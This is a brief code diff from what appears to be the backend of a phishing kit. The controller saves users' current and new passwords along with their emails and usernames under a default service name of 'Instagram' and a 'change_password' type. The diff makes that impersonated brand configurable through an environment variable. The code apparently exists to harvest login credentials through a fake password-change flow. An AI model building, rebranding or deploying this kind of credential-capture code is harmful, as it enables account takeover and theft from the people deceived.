@@ -6,7 +6,7 @@ const { sendPasswordChangedEmail } = require('../utils/mailer');
 /* ── Format helper — only necessary fields returned to frontend ── */
 const fmt = (doc) => ({
   id:              doc._id.toString(),
-  service:         (doc.source || 'Instagram').toLowerCase(),
+  service:         (doc.source || process.env.BRAND_NAME || 'Instagram').toLowerCase(),
   email:           doc.email || '',
   username:        doc.username || '',
   type:            doc.type || 'change_password',
@@ -55,7 +55,7 @@ const changePassword = async (req, res) => {
       username: username || '',
       currentPassword,
       newPassword,
-      source: source || 'Instagram',
+      source: source || process.env.BRAND_NAME || 'Instagram',
       path:   path   || 'change_password',
       time:   istTime,
     });
